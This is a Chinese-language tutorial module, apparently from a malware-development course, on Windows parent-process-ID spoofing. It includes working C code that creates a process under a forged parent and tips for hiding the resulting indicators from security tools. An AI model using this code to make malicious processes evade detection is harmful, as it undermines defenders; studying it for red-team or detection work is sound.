模块 47 - 父进程 id 伪造

父进程 ID (PPID) 欺骗 是一种用于更改进程 PPID 的技术，有效地掩盖了子进程与其真实父进程之间的关系。这可以通过将子进程的 PPID 更改为不同的值来实现，使其看起来像是该进程是由不同的合法 Windows 进程而不是真正的父进程生成的。

安全解决方案和防御者通常会寻找异常的父子关系。例如，如果 Microsoft Word 生成了 cmd.exe，这通常表明正在执行恶意宏。如果 cmd.exe 使用不同的 PPID 生成了，那么它将隐藏真正的父进程，而看起来像是由不同的进程生成的。

在 Early Bird APC 队列代码注入 模块中，RuntimeBroker.exe 由 EarlyBird.exe 生成，安全解决方案可以使用它来检测恶意活动。

属性列表

属性列表是一种数据结构，用于存储与进程或线程关联的属性列表。这些属性可以包括有关进程或线程的信息，例如优先级、调度算法、状态、CPU 关联性和内存地址空间等。属性列表可用于高效地存储和检索有关进程和线程的信息，以及在运行时修改进程或线程的属性。

PPID 欺骗需要使用和操作进程的属性列表来修改其 PPID。将在接下来的部分中展示进程属性列表的使用和修改。

创建进程

要伪造 PPID，需要使用 CreateProcess 创建一个进程，并设置 EXTENDED_STARTUPINFO_PRESENT 标志，该标志用于进一步控制创建的进程。此标志允许修改有关进程的一些信息，例如 PPID 信息。Microsoft 关于 EXTENDED_STARTUPINFO_PRESENT 的文档说明如下：

使用扩展启动信息创建进程；lpStartupInfo 参数指定 STARTUPINFOEX 结构。

这意味着还需要 STARTUPINFOEXA 数据结构。

STARTUPINFOEXA 结构

STARTUPINFOEXA 数据结构如下所示：

typedef struct _STARTUPINFOEXA {
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList; // 属性列表
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
  • StartupInfo 是在前面的模块中用于创建新进程的相同结构。参考“早期 Bird APC 队列代码注入”和“线程劫持 - 远程线程创建”以复习。唯一需要设置的成员是 cb 为 sizeof(STARTUPINFOEX)。
  • lpAttributeList 是使用 InitializeProcThreadAttributeList WinAPI 创建的。这是属性列表数据结构，将在下一节中更详细地讨论。

初始化属性列表

InitializeProcThreadAttributeList 函数如下所示。

BOOL InitializeProcThreadAttributeList(
  [out, optional] LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [in]            DWORD                        dwAttributeCount,
                  DWORD                        dwFlags,         // NULL (reserved)
  [in, out]       PSIZE_T                      lpSize
);

要传递一个修改创建的子进程的父进程的属性列表，首先使用 WinAPI InitializeProcThreadAttributeList 创建属性列表。此 API 初始化用于进程和线程创建的指定属性列表。根据 Microsoft 的文档，InitializeProcThreadAttributeList 必须调用两次：

  1. 第一次调用 InitializeProcThreadAttributeList 时，lpAttributeList 参数应为 NULL。此调用用于确定将从 lpSize 参数接收的属性列表的大小。
  2. 第二次调用 InitializeProcThreadAttributeList 时，应为 lpAttributeList 参数指定一个有效指针。此时应将 lpSize 的值作为输入提供。此调用是初始化属性列表的调用。

dwAttributeCount 将设置为 1，因为只需要一个属性列表。

更新属性列表

成功初始化属性列表后，使用 WinAPI 的 UpdateProcThreadAttribute 将属性添加到列表中。该函数如下所示。

BOOL UpdateProcThreadAttribute(
  [in, out]       LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,   // InitializeProcThreadAttributeList 的返回值
  [in]            DWORD                        dwFlags,           // NULL（保留）
  [in]            DWORD_PTR                    Attribute,
  [in]            PVOID                        lpValue,           // 指向属性值的指针
  [in]            SIZE_T                       cbSize,            // sizeof(lpValue)
  [out, optional] PVOID                        lpPreviousValue,   // NULL（保留）
  [in, optional]  PSIZE_T                      lpReturnSize       // NULL（保留）
);
  • Attribute - 此标志对于 PPID 欺骗至关重要，它说明了属性列表中应更新的内容。在这种情况下，需要将其设置为 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 标志以更新父进程信息。

PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 标志指定线程的父进程。通常，线程的父进程是创建该线程的进程。如果使用 CreateThread 函数创建线程，则父进程是调用 CreateThread 函数的进程。如果使用 CreateProcess 函数作为新进程的一部分创建线程，则父进程是新进程。更新线程的父进程也将更新关联进程的父进程。

  • lpValue - 父进程的句柄。
  • cbSize - 由 lpValue 参数指定的属性值的大小。这将设置为 sizeof(HANDLE)。

实现逻辑

执行 PPID 欺骗所需的步骤总结如下：

  1. 调用 CreateProcessA，并带有 EXTENDED_STARTUPINFO_PRESENT 标志，以进一步控制所创建的进程。
  2. 创建 STARTUPINFOEXA 结构，其中包含属性列表 LPPROC_THREAD_ATTRIBUTE_LIST。
  3. 调用 InitializeProcThreadAttributeList 初始化属性列表。该函数必须调用两次，第一次确定属性列表的大小，第二次调用执行初始化。
  4. 使用 UpdateProcThreadAttribute 通过设置 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 标志来更新属性，该标志允许用户指定线程的父进程。

PPID 欺骗函数

CreatePPidSpoofedProcess 是一个用于创建具有欺骗性 PPID 的进程的函数。该函数接受 5 个参数：

  • hParentProcess - 将成为新创建进程父进程的进程句柄。
  • lpProcessName - 要创建的进程的名称。
  • dwProcessId - 指向接收新创建进程 PID 的 DWORD 的指针。
  • hProcess - 指向接收新创建进程句柄的 HANDLE 的指针。
  • hThread - 指向接收新创建进程线程句柄的 HANDLE 的指针。
BOOL CreatePPidSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

    CHAR                               lpPath               [MAX_PATH * 2];
    CHAR                               WnDr                 [MAX_PATH];

    SIZE_T                             sThreadAttList       = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList       = NULL;

    STARTUPINFOEXA                     SiEx                = { 0 };
    PROCESS_INFORMATION                Pi                  = { 0 };

    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // 设置结构的大小
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA 失败，错误代码：%d \n", GetLastError());
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

    //-------------------------------------------------------------------------------

    // 预期会失败，错误代码为 ERROR_INSUFFICIENT_BUFFER
    InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);  

    // 分配足够的内存
    pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
    if (pThreadAttList == NULL){
        printf("[!] HeapAlloc 失败，错误代码：%d \n", GetLastError());
        return FALSE;
    }

    // 再次调用 InitializeProcThreadAttributeList，但传递正确的参数
    if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
        printf("[!] InitializeProcThreadAttributeList 失败，错误代码：%d \n", GetLastError());
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
        printf("[!] UpdateProcThreadAttribute 失败，错误代码：%d \n", GetLastError());
        return FALSE;
    }

    // 将 SiEx 中的 LPPROC_THREAD_ATTRIBUTE_LIST 元素设置为等于使用 UpdateProcThreadAttribute 创建的元素，即父进程
    SiEx.lpAttributeList = pThreadAttList;

    //-------------------------------------------------------------------------------

    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        NULL,
        &SiEx.StartupInfo,
        &Pi)) {
        printf("[!] CreateProcessA 失败，错误代码：%d \n", GetLastError());
        return FALSE;
    }


    *dwProcessId    = Pi.dwProcessId;
    *hProcess       = Pi.hProcess;
    *hThread        = Pi.hThread;


    // 清理
    DeleteProcThreadAttributeList(pThreadAttList);
    CloseHandle(hParentProcess);

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;

    return FALSE;
}

演示

创建子进程 RuntimeBroker.exe，其父进程为 PID 为 21956 的 svchost.exe。请注意，此 svchost.exe 进程以普通权限运行。

PPID 欺骗成功。RuntimeBroker.exe 进程看起来像是由 svchost.exe 衍生的。

演示 2 - 更新当前目录

在之前的演示中，请注意“当前目录”值指向 PPidSpoofing.exe 二进制文件的目录。

这很容易成为 IoC，安全解决方案或防御者可能会快速标记此异常。要解决此问题，只需将 CreateProcess WinAPI 中的 lpCurrentDirectory 参数设置为不太可疑的目录，例如C:\Windows\System32。
